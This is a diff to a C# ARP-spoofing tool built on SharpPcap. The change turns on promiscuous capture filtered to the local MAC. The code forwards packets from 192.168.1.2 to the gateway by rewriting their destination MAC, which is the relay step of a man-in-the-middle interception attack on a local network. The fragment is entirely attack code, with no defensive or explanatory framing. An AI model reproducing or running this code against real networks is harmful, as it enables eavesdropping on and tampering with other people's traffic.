@@ -262,7 +262,6 @@ namespace ARPSpoofing
                 {
                     IPPacket ipPacket = ethernetPacket.Extract<IPPacket>();
                     if (ipPacket == null) return;
-
                     if (ipPacket.SourceAddress.ToString() == "192.168.1.2")
                     {
                         //var tempTcpPacket = new TcpPacket(outerTcpPacket.SourcePort, outerTcpPacket.DestinationPort);
@@ -276,7 +275,6 @@ namespace ARPSpoofing
                         //tempIpV4Packet.TimeToLive = 128;
                         //tempIpV4Packet.Protocol = PacketDotNet.ProtocolType.Tcp;
                         //tempIpV4Packet.PayloadPacket = tempTcpPacket;
-
                         ethernetPacket.DestinationHardwareAddress = GatewayMac;
                         device.SendPacket(ethernetPacket);
                     }
@@ -487,8 +485,8 @@ namespace ARPSpoofing
                 LibPcapLiveDevice.OnPacketArrival -= new PacketArrivalEventHandler(OnPacketArrival);
                 LibPcapLiveDevice.OnPacketArrival += new PacketArrivalEventHandler(OnPacketArrival);
                 LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
-                //LibPcapLiveDevice.Filter = "ether dst " + LocalMac.ToString();
-                //LibPcapLiveDevice.StartCapture();
+                LibPcapLiveDevice.Filter = "ether dst " + LocalMac.ToString();
+                LibPcapLiveDevice.StartCapture();
             
             }
             foreach (var compute in target)
